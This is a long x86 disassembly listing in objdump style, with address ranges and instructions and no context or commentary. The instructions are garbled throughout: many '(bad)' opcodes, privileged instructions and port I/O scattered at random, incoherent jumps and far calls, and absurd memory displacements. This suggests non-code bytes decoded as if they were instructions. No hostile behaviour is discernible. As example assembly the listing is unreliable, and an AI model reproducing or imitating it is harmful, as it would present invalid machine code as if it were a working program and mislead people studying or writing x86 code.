  431fc1:	mov    edx,DWORD PTR [eax+0x8]
  431fc4:	jne    0x431f86
  431fc6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431fcd:	inc    ebp
  431fce:	push   esp
  431fcf:	test   DWORD PTR [ecx+0xf],ecx
  431fd2:	sub    edx,esp
  431fd4:	add    eax,DWORD PTR [eax]
  431fd6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fdc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fe3:	mov    eax,DWORD PTR [ecx]
  431fe5:	and    BYTE PTR [eax],al
  431fe7:	cmp    dl,BYTE PTR [eax]
  431fe9:	add    BYTE PTR [ebp+0x66],al
  431fec:	inc    ecx
  431fee:	push   esp
  431fef:	add    BYTE PTR [ebp+0x0],dh
  431ff2:	push   edx
  431ff3:	enterw 0xc1,0x4d
  431ff8:	mov    esp,DWORD PTR [esi+0x20]
  431ffb:	add    DWORD PTR [ecx-0x7b],eax
  431ffe:	add    eax,DWORD PTR [ebx]
  432000:	str    WORD PTR [eax+0x45]
  432004:	lea    ecx,[ebx+0x45890801]
  43200a:	sbb    BYTE PTR [ebx],al
  43200c:	dec    ebp
  43200d:	cmp    al,0xf
  43200f:	inc    ebp
  432010:	push   eax
  432011:	mov    esi,DWORD PTR [ebx]
  432013:	push   eax
  432014:	add    eax,eax
  432016:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43201d:	inc    ebp
  43201e:	add    BYTE PTR ds:0x8b4d8c00,dh
  432024:	xor    edx,esp
  432026:	add    eax,esi
  432028:	mov    ebx,eax
  43202a:	loopne 0x432071
  43202c:	dec    ebp
  43202d:	mov    ecx,DWORD PTR [edi]
  43202f:	cld    
  432030:	push   eax
  432031:	xchg   DWORD PTR [ebx],esi
  432033:	add    DWORD PTR [ebx],ebp
  432035:	add    BYTE PTR [ebx],ch
  432037:	or     BYTE PTR [ecx],bh
  432039:	dec    ecx
  43203a:	loopne 0x43203f
  43203c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432042:	push   ebp
  432043:	add    DWORD PTR [ebx+0x55100800],eax
  432049:	dec    ebp
  43204a:	jmp    0x431fd5
  43204c:	mov    esp,DWORD PTR [eax]
  43204e:	sbb    dl,dl
  432050:	inc    eax
  432051:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432057:	add    BYTE PTR [ebx+0x74528555],cl
  43205d:	push   ebp
  43205e:	div    DWORD PTR [ebx]
  432060:	and    eax,DWORD PTR [ebx]
  432062:	add    edx,DWORD PTR [edx-0x30]
  432065:	jno    0x431ff2
  432067:	inc    DWORD PTR [eax+eiz*1]
  43206a:	inc    ebp
  43206b:	push   eax
  43206c:	push   eax
  43206d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432073:	mov    edi,esp
  432075:	push   eax
  432076:	inc    ebp
  432077:	enter  0x458b,0x8
  43207b:	push   ecx
  43207c:	(bad)  
  43207d:	call   0x10d2a55
  432082:	pop    ss
  432083:	push   ebp
  432084:	mov    ecx,DWORD PTR [ebx+0x489408]
  43208a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432090:	push   ecx
  432091:	jo     0x43207b
  432093:	inc    DWORD PTR [edi]
  432095:	or     BYTE PTR [eax],al
  432097:	call   0xce27e1
  43209c:	fmul   QWORD PTR [ebp+0x55]
  43209f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4320a5:	mov    bh,0x8c
  4320a7:	adc    al,0x9a
  4320a9:	dec    esp
  4320aa:	xor    bl,BYTE PTR [eax]
  4320ac:	mov    ecx,DWORD PTR [ebp+0xc]
  4320af:	mov    eax,DWORD PTR [ebp-0x4]
  4320b2:	mov    esi,DWORD PTR [edi-0x3148f924]
  4320b8:	push   es
  4320b9:	retf   
  4320ba:	mov    BYTE PTR [ebp-0x30],0x3b
  4320be:	inc    ebp
  4320bf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4320c6:	retf   0x83fc
  4320c9:	into   
  4320ca:	dec    ebp
  4320cb:	retf   
  4320cc:	mov    ecx,DWORD PTR [ebp-0x74]
  4320cf:	mov    eax,DWORD PTR [eax]
  4320d1:	fdiv   QWORD PTR [ebx]
  4320d3:	mov    bh,0x3
  4320d5:	push   es
  4320d6:	mov    esi,ecx
  4320d8:	sbb    cl,dl
  4320da:	dec    ebp
  4320db:	sar    DWORD PTR [ebx],cl
  4320dd:	push   ebp
  4320de:	jne    0x4320ef
  4320e0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320e6:	lea    ebx,[eax]
  4320e8:	call   0xf4ccacaf
  4320ed:	sbb    dh,dl
  4320ef:	add    edx,ebx
  4320f1:	push   ebp
  4320f2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320f8:	push   ecx
  4320f9:	mov    DWORD PTR [eax-0x30],edx
  4320fc:	test   DWORD PTR [edx],eax
  4320fe:	xadd   esp,esi
  432101:	pop    es
  432102:	add    cl,dl
  432104:	mov    eax,ecx
  432106:	or     al,0x45
  432108:	(bad)  
  432109:	push   eax
  43210a:	add    DWORD PTR [edx+0x0],eax
  43210d:	add    ecx,DWORD PTR [ecx]
  43210f:	and    dh,cl
  432111:	call   0xc729e1
  432116:	add    DWORD PTR [ebp+0x0],edx
  432119:	mov    esp,DWORD PTR [ebp+0x18]
  43211c:	add    BYTE PTR [eax+0x54],cl
  43211f:	xor    eax,DWORD PTR [eax]
  432121:	add    esp,DWORD PTR [esi+0x3b]
  432124:	inc    ebp
  432125:	je     0x4320aa
  432127:	push   ecx
  432128:	cli    
  432129:	dec    ebp
  43212a:	mov    DWORD PTR [ebx],eax
  43212c:	(bad)  
  43212d:	or     al,0x5e
  43212f:	inc    eax
  432130:	add    BYTE PTR [ebx],al
  432132:	data16 and BYTE PTR [ebp+0x50],al
  432136:	sub    DWORD PTR [ecx],0xfffffff8
  432139:	add    BYTE PTR [ebp-0x75],ah
  43213c:	add    BYTE PTR [eax],bl
  43213e:	enter  0x894d,0x8b
  432142:	int3   
  432143:	loopne 0x43217f
  432145:	rol    BYTE PTR [eax],0x33
  432148:	lea    cx,[ebp+0xa]
  43214c:	data16 jb 0x432194
  43214f:	add    BYTE PTR [ebx+0x44890855],cl
  432155:	sbb    ah,al
  432157:	inc    ebp
  432158:	cmp    cl,BYTE PTR [edi]
  43215a:	add    BYTE PTR [edx+0x66],dl
  43215d:	xor    ecx,DWORD PTR [eax]
  43215f:	sub    eax,DWORD PTR [eax]
  432161:	mov    eax,DWORD PTR [eax]
  432163:	or     al,0x66
  432165:	ror    edx,cl
  432167:	dec    ebp
  432168:	inc    ebp
  432169:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43216f:	cld    
  432170:	or     BYTE PTR [edi+0x4501dd],dl
  432176:	ror    dh,0xee
  432179:	retf   
  43217a:	(bad)  
  43217b:	dec    ebp
  43217c:	mov    al,0x8b
  43217e:	loop   0x4321a0
  432180:	cmp    ecx,DWORD PTR [edx]
  432182:	inc    ebp
  432183:	daa    
  432184:	loop   0x43210d
  432186:	out    dx,al
  432187:	add    edi,eax
  432189:	add    BYTE PTR [eax+0x3f52ed55],bh
  43218f:	push   ebp
  432190:	inc    ebp
  432191:	xor    ebx,eax
  432193:	add    ebp,esi
  432195:	push   edx
  432196:	push   bp
  432198:	inc    ebp
  432199:	(bad)  
  43219a:	jmp    0xc342e7f3
  43219f:	sbb    al,0x33
  4321a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4321a8:	add    BYTE PTR [ebp+0x45],0x8b
  4321ac:	jmp    0xf98b:0x100041c8
  4321b3:	xor    esi,DWORD PTR [edx+0x3]
  4321b6:	mov    ecx,DWORD PTR [edi]
  4321b8:	fmul   DWORD PTR [edx]
  4321ba:	add    BYTE PTR [eax],al
  4321bc:	lea    eax,[ebx-0x4700273c]
  4321c2:	add    al,0x4f
  4321c4:	pop    DWORD PTR [eax]
  4321c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4321cc:	push   edx
  4321cd:	inc    WORD PTR [ebp+0x8]
  4321d1:	mov    eax,0x514f4d
  4321d6:	(bad)
  4321da:	add    al,al
  4321dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321e2:	test   DWORD PTR [esi+0x74],esp
  4321e5:	inc    ebp
  4321e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4321ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321f2:	or     dh,cl
  4321f4:	or     eax,0x8b8d5045
  4321f9:	inc    ebp
  4321fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432200:	jne    0x432235
  432202:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432208:	add    DWORD PTR [ebx],eax
  43220a:	add    bh,bh
  43220c:	adc    DWORD PTR [eax],ecx
  43220e:	adc    DWORD PTR [ebp+0x55],edi
  432211:	push   es
  432212:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432218:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43221f:	inc    ebp
  432220:	mov    esp,edi
  432222:	or     al,0xd8
  432224:	push   eax
  432225:	(bad)  
  432226:	jne    0x4321dc
  432228:	call   0x3b1b15
  43222d:	inc    ebp
  43222e:	sar    BYTE PTR [edx],0x84
  432231:	out    dx,al
  432232:	add    bh,al
  432234:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43223b:	(bad)  
  43223c:	and    al,al
  43223e:	fs jmp 0x7cc86843
  432244:	bswap  ecx
  432246:	scas   al,BYTE PTR es:[edi]
  432247:	inc    esp
  432248:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43224f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432256:	call   DWORD PTR [edi]
  432258:	shr    ah,0x84
  43225b:	xchg   DWORD PTR [eax],eax
  43225d:	add    DWORD PTR [eax],eax
  43225f:	add    bh,bh
  432261:	dec    ebp
  432262:	and    BYTE PTR [ecx-0x38],dl
  432265:	push   eax
  432266:	dec    DWORD PTR [ebx+0xfd885]
  43226c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432272:	mov    WORD PTR [ecx+0x0],ss
  432275:	lea    ecx,[ebx+0x108b20d8]
  43227b:	mov    WORD PTR [edx],ds
  43227d:	add    BYTE PTR [edi+0xff01ff],al
  432283:	mov    ecx,DWORD PTR [ebp-0x28]
  432286:	push   ecx
  432287:	shl    BYTE PTR [ebp+0x3a],0x8b
  43228b:	inc    ebp
  43228c:	in     al,0xeb
  43228e:	jno    0x43221b
  432290:	push   edx
  432291:	mov    DWORD PTR [eax-0x28],edx
  432294:	mov    eax,DWORD PTR [ebp+0x20]
  432297:	je     0x432220
  432299:	mov    eax,DWORD PTR [ecx]
  43229b:	sbb    BYTE PTR [eax],al
  43229d:	pop    DWORD PTR [eax]
  43229f:	add    esi,eax
  4322a1:	add    bl,al
  4322a3:	adc    DWORD PTR [edi],esi
  4322a5:	jmp    0x8bce72f7
  4322aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4322b1:	jne    0x43223e
  4322b3:	mov    ecx,DWORD PTR [eax]
  4322b5:	in     al,0x75
  4322b7:	pop    DWORD PTR [ecx+0x5301]
  4322bd:	push   edx
  4322be:	inc    DWORD PTR [ebx]
  4322c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4322c6:	add    BYTE PTR [edi+0x9],dl
  4322c9:	call   DWORD PTR [esi]
  4322cb:	and    dl,al
  4322cd:	and    bh,bh
  4322cf:	inc    edi
  4322d1:	test   eax,edx
  4322d3:	sldt   ebx
  4322d6:	xor    al,0x0
  4322d8:	pushf  
  4322d9:	(bad)  
  4322da:	jmp    0x4322e8
  4322dc:	mov    eax,edi
  4322de:	or     al,0x75
  4322e0:	inc    eax
  4322e1:	call   0x4319e9
  4322e6:	mov    eax,eax
  4322e8:	loopne 0x43226e
  4322ea:	inc    ebp
  4322eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4322f1:	mov    eax,DWORD PTR [ebp+0x20]
  4322f4:	add    edi,ecx
  4322f6:	add    BYTE PTR [eax],ch
  4322f8:	cmp    edi,0x18
  4322fb:	test   DWORD PTR [ebp+0xf],esi
  4322fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432305:	jne    0x432309
  432307:	call   0xffa21dcc
  43230c:	leave  
  43230d:	rcr    BYTE PTR [esp+eax*4],0x55
  432311:	add    ah,ch
  432313:	add    BYTE PTR [edi-0x48fef979],dh
  432319:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432320:	inc    esp
  432321:	mov    ebx,DWORD PTR [eax]
  432323:	fcom   st(2)
  432325:	add    BYTE PTR [edi],bl
  432327:	lea    ecx,[eax-0x18]
  43232a:	(bad)  
  43232b:	push   DWORD PTR [ecx]
  43232d:	call   0xffb5708f
  432332:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432336:	fstp   DWORD PTR [esi+ebx*8]
  432339:	push   ebp
  43233a:	pop    ebp
  43233b:	mov    esi,DWORD PTR [edx-0x38]
  43233e:	add    DWORD PTR [eax],0x28
  432341:	mov    edi,DWORD PTR [ebx]
  432343:	xor    esi,DWORD PTR [edx+0x3]
  432346:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43234a:	pop    ebp
  43234b:	or     al,0x4
  43234d:	inc    ecx
  43234e:	push   ebp
  43234f:	(bad)  
  432350:	in     al,dx
  432351:	or     ah,ch
  432353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432354:	xbegin 0xffc8994a
  43235a:	clc    
  43235b:	adc    al,0x45
  43235d:	div    BYTE PTR [eax+ecx*1]
  432360:	pushf  
  432361:	add    bh,al
  432363:	jne    0x43233d
  432365:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43236f:	add    eax,DWORD PTR [ebp+0x52]
  432372:	adc    eax,0x20
  432375:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43237b:	test   DWORD PTR [eax],eax
  43237d:	clc    
  43237e:	data16 or al,BYTE PTR [ebp+0x45]
  432382:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432389:	rol    BYTE PTR [ebp+0x45],1
  43238c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432392:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432398:	push   ebx
  432399:	add    BYTE PTR [ebx+0x0],dl
  43239c:	push   ecx
  43239d:	jge    0x4323d2
  43239f:	add    BYTE PTR [esi+0x4],dl
  4323a2:	jne    0x432409
  4323a4:	mov    edx,0x457200
  4323a9:	jmp    0x43236d
  4323ab:	xor    edi,DWORD PTR [ebx]
  4323ad:	pop    edi
  4323ae:	cvtdq2ps xmm7,xmm0
  4323b1:	ret    0x0
  4323b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4323ba:	xor    ecx,DWORD PTR [edi]
  4323bc:	add    eax,DWORD PTR [ecx+0x3b]
  4323bf:	push   ebx
  4323c0:	rdpmc  
  4323c2:	out    0x8d,al
  4323c4:	add    BYTE PTR [eax],cl
  4323c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4323cc:	ret    0x450c
  4323cf:	sbb    al,0x8b
  4323d1:	cmp    eax,esi
  4323d3:	or     cl,al
  4323d5:	or     al,0xc2
  4323d7:	pop    eax
  4323d8:	inc    ebp
  4323d9:	add    ecx,DWORD PTR [edi]
  4323db:	add    esi,DWORD PTR [ebp+0x39]
  4323de:	invd   
  4323e0:	jge    0x4323ec
  4323e2:	mov    eax,0x478ac0
  4323e7:	cli    
  4323e8:	xor    esp,ecx
  4323ea:	mov    ebx,0x5b8ac0
  4323ef:	ret    0x33
  4323f2:	mov    eax,0x833b8b
  4323f7:	sub    BYTE PTR [ebx],al
  4323f9:	inc    ebp
  4323fa:	xor    ax,0x9cf8
  4323fe:	inc    bh
  432400:	mov    esp,esp
  432402:	hlt    
  432403:	test   DWORD PTR [ebp-0x8],esi
  432406:	mov    eax,DWORD PTR [ebp-0x14]
  432409:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43240f:	dec    edi
  432410:	or     BYTE PTR [eax],al
  432412:	jne    0x43239d
  432414:	mov    esi,esp
  432416:	call   0x77a9afdb
  43241b:	inc    ebp
  43241c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432422:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432428:	add    BYTE PTR [esi+0x7d],ah
  43242b:	inc    ebp
  43242c:	mov    bx,WORD PTR [ebp+0x8]
  432430:	add    DWORD PTR [ebp+0x53],0x30c008b
  432437:	inc    ebp
  432438:	mov    bx,di
  43243b:	lock test BYTE PTR [ecx+0x7000801],bh
  432442:	jge    0x432405
  432444:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43244a:	cli    
  43244b:	xor    bl,bh
  43244d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432453:	test   BYTE PTR [eax],cl
  432455:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43245c:	cmp    ebp,eax
  43245e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432465:	test   BYTE PTR [ebp+0x1],bh
  432468:	mov    ebx,0x458a00
  43246d:	xor    esi,DWORD PTR [ebx]
  43246f:	add    esp,DWORD PTR [esi-0x77]
  432472:	pop    ebp
  432473:	loopne 0x4324db
  432475:	inc    ebp
  432476:	clc    
  432477:	xor    edi,DWORD PTR [ebx]
  432479:	add    esi,DWORD PTR [edx-0x77]
  43247c:	data16 fdivr QWORD PTR [ebp-0x49]
  432480:	mov    ebx,0xb78afc
  432485:	hlt    
  432486:	xor    edi,DWORD PTR [edx]
  432488:	data16 add BYTE PTR [ebp+0x66],bl
  43248c:	data16 lock clc 
  43248f:	cmp    bh,BYTE PTR [ebx]
  432491:	add    BYTE PTR [edi+0x66],dh
  432494:	psubq  mm7,QWORD PTR [ebp+0x0]
  432498:	ltr    WORD PTR [ebp+0x66]
  43249c:	add    esi,eax
  43249e:	add    di,WORD PTR [ebp+0x2b]
  4324a2:	data16 data16 jge 0x432523
  4324a6:	mov    ebx,0xe08a8b
  4324ab:	jge    0x4324e0
  4324ad:	data16 data16 xor al,0x5d
  4324b1:	data16 data16 jne 0x4324ad
  4324b5:	mov    edi,DWORD PTR [ebx]
  4324b7:	fdiv   QWORD PTR [edx+0x7d]
  4324ba:	data16 data16 jge 0x4324f2
  4324be:	mov    ebx,0x758a66
  4324c3:	mov    esi,0x667233
  4324c8:	pop    ebp
  4324c9:	or     BYTE PTR [esi+0x0],ah
  4324cc:	clc    
  4324cd:	mov    edi,DWORD PTR [ebx]
  4324cf:	lock ja 0x43245d
  4324d2:	(bad)  
  4324d4:	jge    0x4324cd
  4324d6:	invd   
  4324d8:	pop    ebp
  4324d9:	add    BYTE PTR [ebx],al
  4324db:	(bad)  
  4324dc:	cmp    di,WORD PTR [ebp+0xf]
  4324e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324e4:	mov    bx,WORD PTR [ebp-0x10]
  4324e8:	pop    bp
  4324ea:	fbstp  TBYTE PTR [ebx]
  4324ec:	test   DWORD PTR [ebx],eax
  4324ee:	add    BYTE PTR [ebx],bh
  4324f0:	add    BYTE PTR [esi+0x7d],ah
  4324f3:	jge    0x432480
  4324f5:	data16 in al,dx
  4324f7:	pop    ebp
  4324f8:	stc    
  4324f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432500:	mov    edi,ebx
  432502:	in     al,dx
  432503:	test   BYTE PTR [ebp+0x0],bh
  432506:	mov    eax,DWORD PTR [eax]
  432508:	call   0xbd401e98
  43250d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432513:	sti    
  432514:	call   0x8b4ba2a4
  432519:	add    ebp,esp
  43251b:	mov    bx,di
  43251e:	jnp    0x432546
  432520:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432526:	mov    eax,DWORD PTR [eax]
  432528:	call   0x7c3eb093
  43252d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432533:	data16 data16 fistp WORD PTR [ebp+0xe]
  432538:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432542:	fisttp WORD PTR [ecx-0x7401f77b]
  432548:	(bad)  
  432549:	cld    
  43254a:	jne    0x432586
  43254c:	xor    eax,DWORD PTR [eax]
  43254e:	mov    esp,DWORD PTR [esi-0x10]
  432551:	sti    
  432552:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432559:	data16 adc bl,bh
  43255c:	push   ebp
  43255d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432564:	mov    WORD PTR [eax],es
  432566:	call   0xe48b:0x89fb3266
  43256d:	or     al,0x55
  43256f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432575:	push   cs
  432576:	push   esi
  432577:	mov    bh,0xc8
  432579:	or     al,0x2b
  43257b:	mov    bh,0xba
  43257d:	hlt    
  43257e:	mov    bh,bl
  432580:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432586:	dec    edi
  432587:	or     al,0x0
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	or     BYTE PTR [ebp+0x3b],dh
  43258e:	mov    ecx,DWORD PTR [edi]
  432590:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432596:	xor    al,0xd8
  432598:	pop    bp
  43259a:	lock xor esi,DWORD PTR [ebx]
  43259d:	lea    esp,[esi+0x1f]
  4325a0:	icebp  
  4325a1:	jb     0x4325a7
  4325a3:	add    al,al
  4325a5:	jge    0x4325b3
  4325a7:	mov    eax,eax
  4325a9:	fsubr  st,st(3)
  4325ab:	pop    ebp
  4325ac:	mov    esi,DWORD PTR [ebx]
  4325ae:	in     al,0x8d
  4325b0:	rcr    DWORD PTR [edi],0xc2
  4325b3:	jb     0x432613
  4325b5:	add    cl,cl
  4325b7:	jge    0x4325c5
  4325b9:	mov    edx,DWORD PTR [ebp-0x20]
  4325bc:	in     al,dx
  4325bd:	pop    ebp
  4325be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325c3:	cmp    di,WORD PTR [ebp+0x0]
  4325c7:	mov    ebp,DWORD PTR [ebx]
  4325c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4325cf:	cmp    al,0x33
  4325d1:	mov    si,0x4f7d
  4325d5:	mov    eax,DWORD PTR [eax]
  4325d7:	lock inc ebp
  4325d9:	mov    esi,DWORD PTR [esi]
  4325db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325e2:	clc    
  4325e3:	(bad)  
  4325e4:	cmp    edi,DWORD PTR [ebx]
  4325e6:	je     0x4325f7
  4325e8:	push   ebx
  4325e9:	loopne 0x4325fa
  4325eb:	dec    ecx
  4325ed:	mov    esp,DWORD PTR [esi-0x1c]
  4325f0:	int    0xf1
  4325f2:	mov    esi,0x703084d
  4325f7:	pcmpgtd mm6,mm1
  4325fa:	add    BYTE PTR [ebp+0x66],dh
  4325fd:	jmp    0x4325ca
  4325ff:	mov    eax,DWORD PTR [ebx]
  432601:	lock push ebp
  432603:	ror    DWORD PTR [ebp-0x2972feb3],1
  432609:	or     bh,dl
  43260b:	jb     0x43260b
  43260d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432613:	loopne 0x432615
  432615:	jne    0x432617
  432617:	data16 add BYTE PTR [esi+eiz*2],dh
  43261b:	mov    ecx,ebx
  43261d:	data16 cmp dh,cl
  432620:	add    BYTE PTR [edx],bh
  432622:	data16 add bl,cl
  432625:	data16 cmp dh,dl
  432628:	add    BYTE PTR [edx],bh
  43262a:	data16 add bl,cl
  43262d:	enterw 0x4df1,0x19
  432632:	pop    edi
  432633:	jne    0x4325b6
  432635:	mov    esi,DWORD PTR [esi]
  432637:	call   0x77b7b1d8
  43263c:	xor    ebp,DWORD PTR [ebx]
  43263e:	lea    esp,[esi+0x48]
  432641:	repnz in eax,0x3b
  432644:	add    BYTE PTR [ebp-0x37],dh
  432647:	xor    edx,DWORD PTR [ebp-0x15]
  43264a:	in     al,dx
  43264b:	xor    edx,DWORD PTR [esi+0x40]
  43264e:	mov    DWORD PTR [edi],0x338545fc
  432654:	clc    
  432655:	add    esi,DWORD PTR ds:0xe85b9c5f
  43265b:	ret    0xff
  43265e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432664:	cmp    DWORD PTR [esi+0x45],edx
  432667:	add    BYTE PTR [eax+eax*1+0x61],bh
  43266b:	data16 (bad) 
  43266d:	into   
  43266e:	data16 cmp cl,ch
  432671:	add    BYTE PTR [ecx+0x7ce0866],bh
  432677:	cmp    ah,BYTE PTR [esi+0x0]
  43267a:	add    bh,al
  43267c:	add    ah,bh
  43267e:	add    BYTE PTR [ebp+0x35c3f866],al
  432684:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43268b:	pop    ebp
  43268c:	adc    al,0x57
  43268e:	add    BYTE PTR [edi-0x723c409a],dh
  432694:	add    edi,edi
  432696:	jne    0x4326eb
  432698:	lea    edx,[ecx+0x1]
  43269b:	mov    ebx,0xd64ff1
  4326a0:	sar    DWORD PTR [ebx],1
  4326a2:	test   BYTE PTR [ebp+0x34],dh
  4326a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326a9:	push   edi
  4326aa:	xor    BYTE PTR [ebx],0x39
  4326ad:	mov    esi,ebx
  4326af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4326b5:	xor    al,0x45
  4326b7:	fs pop ebx
  4326b9:	mov    ebx,0x9c3b36
  4326be:	je     0x4326eb
  4326c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4326c6:	mov    WORD PTR [ebx],?
  4326c8:	xor    al,0xbb
  4326ca:	fs dec edi
  4326cc:	mov    eax,DWORD PTR [eax]
  4326ce:	pop    edi
  4326cf:	cmp    ecx,ecx
  4326d1:	jne    0x432728
  4326d3:	mov    ebp,esp
  4326d5:	cld    
  4326d6:	push   esi
  4326d7:	pop    ebx
  4326d8:	inc    ebp
  4326d9:	stc    
  4326da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4326e2:	clc    
  4326e3:	test   dl,dl
  4326e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4326ea:	or     bl,al
  4326ec:	add    BYTE PTR [ebx+0x57665100],cl
  4326f2:	retf   0x3a45
  4326f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4326fd:	clc    
  4326fe:	add    BYTE PTR [ebx+0x66],bl
  432701:	dec    edx
  432703:	mov    edx,DWORD PTR [edi-0x76]
  432706:	push   edi
  432707:	add    al,0xb7
  432709:	xor    al,0xba
  43270b:	cmp    al,0x8d
  43270d:	je     0x43270e
  43270f:	mov    edx,DWORD PTR [ebx-0x46]
  432712:	push   ecx
  432713:	lea    edi,[ebx+0x534fff]
  432719:	push   ecx
  43271a:	cmp    edx,DWORD PTR [ebx+0x75]
  43271d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432723:	add    BYTE PTR [ebx],dh
  432725:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43272b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432732:	mov    ebx,0x3b3b00
  432737:	jne    0x432764
  432739:	mov    DWORD PTR [ebx+0x728afc],edi
  43273f:	xor    esi,DWORD PTR [ebx]
  432741:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432747:	push   edi
  432748:	cmp    esp,ebp
  43274a:	jne    0x43274c
  43274c:	sbb    DWORD PTR [eax],0x8085c3fc
  432752:	clc    
  432753:	inc    ebp
  432754:	pop    ebx
  432755:	sti    
  432756:	add    eax,0xeb8bc075
  43275b:	cld    
  43275c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432762:	mov    ecx,DWORD PTR [ecx+edx*2]
  432765:	rol    DWORD PTR [ebp-0x37],0xf
  432769:	mov    DWORD PTR [eax],ecx
  43276b:	inc    edi
  43276c:	(bad)  
  43276d:	in     eax,0x0
  43276f:	add    bh,bh
  432771:	(bad)  
  432772:	mov    esi,0xc38a5e
  432777:	mov    esi,DWORD PTR [ebx]
  432779:	push   ecx
  43277a:	mov    edi,0xfc4fc7
  43277f:	test   DWORD PTR [ebp-0x8],edx
  432782:	xor    ax,0x9cc7
  432786:	sub    ebp,eax
  432788:	inc    ebp
  432789:	(bad)  
  43278a:	sub    edi,edi
  43278c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432792:	inc    ebp
  432793:	add    BYTE PTR [esi+0x2b],ah
  432796:	or     bh,BYTE PTR [edx+0xf8ac2]
  43279c:	cmp    al,0x33
  43279e:	mov    edi,DWORD PTR [edx+0x4f81]
  4327a4:	(bad)  
  4327a5:	cmp    esi,DWORD PTR [ebx]
  4327a7:	je     0x432761
  4327a9:	push   ebx
  4327aa:	dec    edi
  4327ab:	str    ecx
  4327ae:	cmp    esp,DWORD PTR [esi+0x75]
  4327b1:	int    0x33
  4327b3:	mov    edi,0x789085f
  4327b8:	mov    edx,DWORD PTR [esp+edi*8]
  4327bb:	add    cl,cl
  4327bd:	data16 add al,0xcb
  4327c0:	push   ebp
  4327c1:	add    ebp,esp
  4327c3:	jne    0x4327b1
  4327c5:	(bad)  
  4327c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4327cc:	clc    
  4327cd:	xlat   BYTE PTR ds:[ebx]
  4327ce:	inc    ebp
  4327cf:	mov    esi,DWORD PTR [eax+edx*2]
  4327d2:	pushf  
  4327d3:	in     eax,0x8b
  4327d5:	add    ah,ch
  4327d7:	add    BYTE PTR [ebx+0x0],dl
  4327da:	push   ecx
  4327db:	add    ax,0x72cb
  4327df:	cmp    al,BYTE PTR [eax]
  4327e1:	add    BYTE PTR [ebp+0x66],al
  4327e4:	(bad)  
  4327e5:	retf   
